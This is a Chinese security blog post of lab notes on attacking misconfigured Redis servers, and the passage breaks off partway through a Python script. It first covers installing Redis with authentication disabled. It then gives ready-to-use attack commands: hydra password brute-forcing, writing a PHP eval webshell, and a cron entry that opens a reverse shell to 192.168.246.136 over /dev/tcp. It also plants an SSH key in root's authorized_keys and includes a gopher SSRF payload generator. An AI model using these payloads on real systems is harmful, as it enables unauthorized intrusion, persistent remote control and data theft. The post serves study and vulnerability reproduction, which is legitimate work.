<!-- build time:Fri Mar 22 2024 17:39:15 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Redis"><link rel="canonical" href="https://blog.xcu.icu/2024/02/18/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis%E6%95%B0%E6%8D%AE%E5%BA%93/"><title>Redis数据库安全 - 服务攻防 | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Redis数据库安全</h1><div class="meta"><span class="item" title="创建时间：2024-02-18 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-02-18T00:00:00+08:00">2024-02-18</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>7.9k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>7 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/97.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/77.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/117.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/149.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/17.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/74.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" itemprop="item" rel="index" title="分类于 服务攻防"><span itemprop="name">服务攻防</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2024/02/18/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis%E6%95%B0%E6%8D%AE%E5%BA%93/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h1 id="前言"><a class="anchor" href="#前言">#</a> 前言</h1><p>​	开坑容易退坑难，但是都是小问题，主要还是一个学习的过程。本篇主要记录 Redis 数据库漏洞的复现，由于是边学习边记录写的一篇笔记写写停停，逻辑混乱、词不达意可能时不时的会出现 <span class="spoiler" title="就你小子偷看??">反正我能看的懂，问题不大</span> ：。</p><h1 id="redis是什么"><a class="anchor" href="#redis是什么">#</a> Redis 是什么？</h1><p>​	这里就是简单的说一说有关 redis 的内容，Redis 全名 Remote Dictionary Server，直译就是远程字典服务。使用 ANSI C 编写的开源、支持网络、基于内存、分布式、可选持久性的键值对 (Key-Value) 存储数据库，提供了多种语言的 API，属于 NoSQL 数据库类型。与传统是数据库不太一样的是，Redis 数据库是将数据缓存在内存中，所以它的读写速度非常之快。</p><p>Redis 默认端口号：</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">6379</span>：默认配置端口号</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">26379</span>：sentinel.conf配置器端口</pre></td></tr></table></figure><h1 id="redis安装"><a class="anchor" href="#redis安装">#</a> Redis 安装</h1><h2 id="安装配置redis-320"><a class="anchor" href="#安装配置redis-320">#</a> 安装配置 redis-3.2.0</h2><p>官网地址：<span class="exturl" data-url="aHR0cHM6Ly9yZWRpcy5pby8=">Redis</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217112320613.png" alt="image-20240217112320613"></p><p>可以去官网下载安装，这里直接使用 wget 命令来安装</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">wget</span> http://download.redis.io/releases/redis-3.2.0.tar.gz </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">tar</span> <span class="token parameter variable">-xzf</span> redis-3.2.0.tar.gz </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">cd</span> redis-3.2.0 </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">make</span></pre></td></tr></table></figure><p>这里如果出现如下报错</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217140436731.png" alt="image-20240217140436731"></p><p>这里是由于系统没有安装 gcc 环境，安装后清除残留重新编译即可</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>yum <span class="token function">install</span> gcc-c++ </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">make</span> distclean</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217140714453.png" alt="image-20240217140714453"></p><p>出现上图所示字样说明编译成功，接下来对编译好的 redis 进行配置</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217141417186.png" alt="image-20240217141417186"></p><p>修改 redis 目录下的 redis.conf 文件，在修改之前建议先对这个文件做备份，当然我是快照战神（细化快照，及时止损）就没有必要了，直接修改这个文件。我们需要修改下面两处（造成未授权漏洞的主要原因）：</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217141646851.png" alt="image-20240217141646851"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217141710079.png" alt="image-20240217141710079"></p><figure class="highlight txt"><figcaption data-lang="txt"></figcaption><table><tr><td data-num="1"></td><td><pre>#bind 127.0.0.1 注释后表示任意机器都能登录</pre></td></tr><tr><td data-num="2"></td><td><pre>protected-mode = no 关闭安全配置</pre></td></tr></table></figure><p>修改完成后我们将这个文件复制到当前目录下的 src 目录下，然后指定配置文件启动即可</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">cp</span> redis.conf ./src/redis.conf</pre></td></tr><tr><td data-num="2"></td><td><pre>./src/redis-server redis.conf</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217142111093.png" alt="image-20240217142111093"></p><p>这样就算是成功了</p><h2 id="redis-408安装"><a class="anchor" href="#redis-408安装">#</a> Redis-4.0.8 安装</h2><p>类似 Redis-3.2.0 的安装，Linux 执行如下命令即可下载和编译安装</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">wget</span> http://download.redis.io/releases/redis-4.0.8.tar.gz</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> redis-4.0.8.tar.gz</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">cd</span> redis-4.0.8</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">make</span></pre></td></tr></table></figure><h2 id="redis基本操作"><a class="anchor" href="#redis基本操作">#</a> redis 基本操作</h2><h3 id="连接"><a class="anchor" href="#连接">#</a> 连接</h3><p>命令如下：</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>redis-cli <span class="token parameter variable">-h</span> <span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span> <span class="token parameter variable">-p</span> <span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>redis-cli <span class="token parameter variable">-h</span> <span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span> <span class="token parameter variable">-p</span> <span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span><span class="token comment">#命令连接方式</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217151430952.png" alt="image-20240217151430952"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217151512619.png" alt="image-20240217151512619"></p><h3 id="设置密码"><a class="anchor" href="#设置密码">#</a> 设置密码</h3><p>redis 编译安装完成后默认是没有密码的，或许是因为这个服务通常在配置文件中通过 bind 绑定到本地？</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>config <span class="token builtin class-name">set</span> requirepass <span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217153440685.png" alt="image-20240217153440685"></p><p>设置完密码后我们的操作就需要先通过认证了</p><p><strong>方式 1</strong>：在连接的时候通过 - a 参数来验证密码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217153501641.png" alt="image-20240217153501641"></p><p><strong>方式 2</strong>：连接上后再认证授权</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217153627698.png" alt="image-20240217153627698"></p><p>具体的使用命令可以参考官方文档，链接：<span class="exturl" data-url="aHR0cHM6Ly9yZWRpcy5pby9jb21tYW5kcy8=">命令 |Redis （英语）</span></p><h3 id="常用"><a class="anchor" href="#常用">#</a> 常用</h3><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>info //查看信息</pre></td></tr><tr><td data-num="2"></td><td><pre>flushall //删除所有数据库内容</pre></td></tr><tr><td data-num="3"></td><td><pre>flushdb //刷新数据库</pre></td></tr><tr><td data-num="4"></td><td><pre>KEYS * //查看所有键，使用select num可以查看键值数据</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">set</span> <span class="token builtin class-name">test</span> <span class="token string">"whoami"</span> //设置变量</pre></td></tr><tr><td data-num="6"></td><td><pre>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> dirpath //设置路径等配置</pre></td></tr><tr><td data-num="7"></td><td><pre>config get dir/dbfilename //获取路径和数据配置信息</pre></td></tr><tr><td data-num="8"></td><td><pre>save //保存</pre></td></tr><tr><td data-num="9"></td><td><pre>get 变量 //查看变量名出</pre></td></tr></table></figure><h1 id="redis漏洞复现"><a class="anchor" href="#redis漏洞复现">#</a> Redis 漏洞复现</h1><h2 id="未授权访问"><a class="anchor" href="#未授权访问">#</a> 未授权访问</h2><p>实际上上面的环境搭建成功后，我们没有设置密码之前就已经算是未授权访问了，通常因为配置不当导致未授权访问漏洞，攻击者可以进一步将恶意数据写入内存或磁盘当中，造成更大危害。漏洞存在的原因就是下面两条</p><ul><li>配置登录策略导致任意机器都可以登录 redis</li><li>未设置密码或设置弱口令</li></ul><p>这里如果允许外部链接但是设置了密码，我们可以通过 hydra 来对其进行爆破</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>hydra <span class="token parameter variable">-P</span> <span class="token punctuation">&#123;</span>密码字典<span class="token punctuation">&#125;</span> redis://<span class="token punctuation">&#123;</span>ip<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="redis写webshell"><a class="anchor" href="#redis写webshell">#</a> redis 写 webshell</h3><p>当我们能操作 redis 数据库后我们可以通过 redis 写 shell 来实现进一步利用，利用条件：<span class="spoiler" title="就你小子偷看??">web 目录权限可读写</span> ：</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/<span class="token comment">#设置写入的目录</span></pre></td></tr><tr><td data-num="2"></td><td><pre>config <span class="token builtin class-name">set</span> dbfilename shell.php<span class="token comment">#设置写入的文件名</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">set</span> shell <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&lt;?php @eval(<span class="token variable">$_POST</span>['xigua']);?><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>#设置写入的内容</pre></td></tr><tr><td data-num="4"></td><td><pre>save<span class="token comment">#保存</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217161539116.png" alt="image-20240217161539116"></p><p>这里保存后去查看对应的目录</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217161631000.png" alt="image-20240217161631000"></p><p>这里可以看到就已经将对应的马写到网站目录下了</p><h3 id="计划任务反弹shell"><a class="anchor" href="#计划任务反弹shell">#</a> 计划任务反弹 shell</h3><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/<span class="token comment">#设置写入的目录</span></pre></td></tr><tr><td data-num="2"></td><td><pre>config <span class="token builtin class-name">set</span> dbfilename shell<span class="token comment">#设置写入的文件名</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">set</span> shell <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * bash -i >&amp; /dev/tcp/192.168.246.136/6767 0>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span> <span class="token comment">#其中 * 代表计划任务的时间</span></pre></td></tr><tr><td data-num="4"></td><td><pre>save <span class="token comment">#保存</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217164322940.png" alt="image-20240217164322940"></p><div class="note info"><p>这种方法只能使用在 centos 上，因为 redis 写入的文件权限是 644，而 ubuntu 要求定时任务权限必须是 600。而且因为 redis 保存 RDB 会存在乱码，在 Ubuntu 上会报错，而在 Centos 上不会报错</p></div><h3 id="写ssh密钥登录ssh"><a class="anchor" href="#写ssh密钥登录ssh">#</a> 写 ssh 密钥登录 ssh</h3><p>利用条件：</p><ol><li>已知登陆用户名</li><li>目标服务器允许 ssh 登录</li></ol><p>首先生成对应的 ssh 秘钥</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217172300049.png" alt="image-20240217172300049"></p><p>然后将生成的 id_rsa.pub 里的内容复制出来</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> /root/.ssh/id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> key.txt</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217172128058.png" alt="image-20240217172128058"></p><p>防止出现乱码，所以前后都加上了空格方便复制</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>flushall</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8E8gTUqcu4p1VZxs3DjobCx+X9Meaz1M4+QsISvjhaw96kNo6ZpSnlZ6pGOsUGqYeeqfp+XV1QHx6s+PIL5h9dNjqLs1uJnrRtGuo8jM9EqKW+LwF+CJQKLqDJdo9HaYGh3BBPwhi28xVoPNJq4rVsS97o7SiquUzucd1fSZe6ooAJxFJg3X1ytjOutb+FJDf1qlBE1OobWn8M5/OkI1CahkPjvBqCevvnMWRn2bplact4gv2wsLdIAQrS6kSAoLPs7xWDTD++Z8IE2m0lSSGBOqpfmVKOf8Pwe0XpzinMwE3EN1SBsW30dvEkHflJID3Zu9KsWef9BveMC46WVPn5loCrnqQW97fv4UAFfRgc1TG77C4O8JVDeZ8KTz0e4S9QPbk8m6PzoevhgD/k+T9fKW5AQM5U6jzuntwmuOsCuzH8pLRDcrZqZjnqgGSPdsYYilODC+59Hx9gkNPYhKoMOTVEScePK45aZakMaMn5ejnh9mYYThmpyM8AYLtYy0= clown@Clown<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span></pre></td></tr><tr><td data-num="3"></td><td><pre>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh/</pre></td></tr><tr><td data-num="4"></td><td><pre>config <span class="token builtin class-name">set</span> dbfilename authorized_keys</pre></td></tr><tr><td data-num="5"></td><td><pre>save</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217174126624.png" alt="image-20240217174126624"></p><p>然后看一下文件是否成功生成了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217174144389.png" alt="image-20240217174144389"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217174033223.png" alt="image-20240217174033223"></p><p>然后直接连接就可以了</p><h2 id="redisssrf组合拳"><a class="anchor" href="#redisssrf组合拳">#</a> Redis&amp;SSRF 组合拳</h2><p>在前面记录 SSRF 的学习中实际上这部分就已经写到过，不过当时更偏向是记录有这样一个东西：<a href="https://blog.xcu.icu/2022/10/31/web/CSRF&amp;SSRF/">CSRF&amp;SSRF - Web | Clown の Blog = (xcu.icu)</a></p><h3 id="resp协议"><a class="anchor" href="#resp协议">#</a> RESP 协议</h3><p>这里这篇的记录还是从这个 RESP 协议开始，对于我来说算是重新认识一下这个协议。RESP 协议实际上是 Redis 服务端和客户端通信的协议，在 redis1.2 中引入，在 2.0 中成为服务器通信的标准方式。可以将 Redis 中的数据结构序列化为文本格式并进行传输。 RESP 协议定义了以下数据类型：</p><ol><li>简单字符串（Simple Strings）：以 &quot;+&quot; 开头，例如 +OK 表示一个简单的字符串 &quot;OK&quot;。</li><li>错误信息（Errors）：以 &quot;-&quot; 开头，例如 -ERR 表示一个错误信息 &quot;ERR&quot;。</li><li>整数（Integers）：以 &quot;:&quot; 开头，例如 :1 表示整数 1。</li><li>批量字符串（Bulk Strings）：以 &quot;$&quot; 开头，例如 $6\r\nfoobar\r\n 表示一个长度为 6 的字符串 &quot;foobar&quot;。</li><li>数组（Arrays）：以 &quot;*&quot; 开头，例如 *3\r\n$3\r\nfoo\r\n$3\r\nbar\r\n$5\r\nhello\r\n 表示一个包含了三个元素的数组 [&quot;foo&quot;, &quot;bar&quot;, &quot;hello&quot;]。</li></ol><p>这里使用 wireshark 来抓包验证一下我们上面所说的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218142638582.png" alt="image-20240218142638582"></p><p>抓取上面的内容，然后追踪流</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218142536426.png" alt="image-20240218142536426"></p><p>抓到 set 和 get 的数据包如上，这里可以看到首先 <code>*3</code> 代表一个长度为三的数组可以简单的理解为 <code>[&quot;set&quot;,&quot;test&quot;,&quot;demo&quot;]</code> ，然后这里 set 前的 <code>$3</code> 表示接下来是一个字符串，长度为三， <code>+OK</code> 表示服务端执行成功后返回的字符串</p><h3 id="组合拳粘合剂"><a class="anchor" href="#组合拳粘合剂">#</a> 组合拳粘合剂</h3><p>这里的粘合剂当然就是 gopher 协议了，在 SSRF 总 gopher 协议算的上是万金油的存在。实际上 gopher 在 http 协议出现之前就已经在 Internet 上很常见了，虽然是组合拳实际上主要是应为 Redis 一般是不出网，所以我们需要利用到 SSRF。</p><p>实际上利用 SSRF 来攻击 Redis 的几种方式和前面是一样的：</p><ol><li>redis 写 webshell</li><li>计划任务反弹 shell</li><li>写 ssh 秘钥登录 ssh</li></ol><p>比如说我们要执行上面的写 shell 的操作</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>flushall</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> <span class="token number">1</span> <span class="token string">'&lt;?php eval($_GET["cmd"]);?>'</span></pre></td></tr><tr><td data-num="3"></td><td><pre>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html</pre></td></tr><tr><td data-num="4"></td><td><pre>config <span class="token builtin class-name">set</span> dbfilename shell.php</pre></td></tr><tr><td data-num="5"></td><td><pre>save</pre></td></tr></table></figure><p>这里用一个网上师傅的脚本</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 导入 quote 函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># 定义协议、IP、端口、要写入的 PHP 代码、文件名、路径、密码、命令列表</span></pre></td></tr><tr><td data-num="5"></td><td><pre>protocol <span class="token operator">=</span> <span class="token string">"gopher://"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>ip <span class="token operator">=</span> <span class="token string">"192.168.246.149"</span></pre></td></tr><tr><td data-num="7"></td><td><pre>port <span class="token operator">=</span> <span class="token string">"6379"</span></pre></td></tr><tr><td data-num="8"></td><td><pre>shell <span class="token operator">=</span> <span class="token string">"\n\n&lt;?php system(\"cat /flag\");?>\n\n"</span></pre></td></tr><tr><td data-num="9"></td><td><pre>filename <span class="token operator">=</span> <span class="token string">"1.php"</span></pre></td></tr><tr><td data-num="10"></td><td><pre>path <span class="token operator">=</span> <span class="token string">"/var/www/html"</span></pre></td></tr><tr><td data-num="11"></td><td><pre>passwd <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="12"></td><td><pre>cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>  <span class="token comment"># 清空 Redis 数据库</span></pre></td></tr><tr><td data-num="13"></td><td><pre>       <span class="token string">"set 1 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 将 PHP 代码写入 Redis 中</span></pre></td></tr><tr><td data-num="14"></td><td><pre>       <span class="token string">"config set dir &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 设置 Redis 工作目录</span></pre></td></tr><tr><td data-num="15"></td><td><pre>       <span class="token string">"config set dbfilename &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 设置 Redis 数据库文件名</span></pre></td></tr><tr><td data-num="16"></td><td><pre>       <span class="token string">"save"</span>  <span class="token comment"># 将 Redis 数据库保存到磁盘中</span></pre></td></tr><tr><td data-num="17"></td><td><pre>       <span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment"># 如果设置了密码，将 AUTH 命令添加到命令列表中</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">if</span> passwd<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"AUTH &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment"># 拼接 payload</span></pre></td></tr><tr><td data-num="24"></td><td><pre>payload <span class="token operator">=</span> protocol <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port <span class="token operator">+</span> <span class="token string">"/_"</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment"># 定义 redis_format 函数，将命令转换为 Redis 格式</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    CRLF <span class="token operator">=</span> <span class="token string">"\r\n"</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    cmd <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    cmd <span class="token operator">+=</span> <span class="token string">"*"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        cmd <span class="token operator">+=</span> CRLF <span class="token operator">+</span> <span class="token string">"$"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> CRLF <span class="token operator">+</span> x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    cmd <span class="token operator">+=</span> CRLF</pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">return</span> cmd</pre></td></tr><tr><td 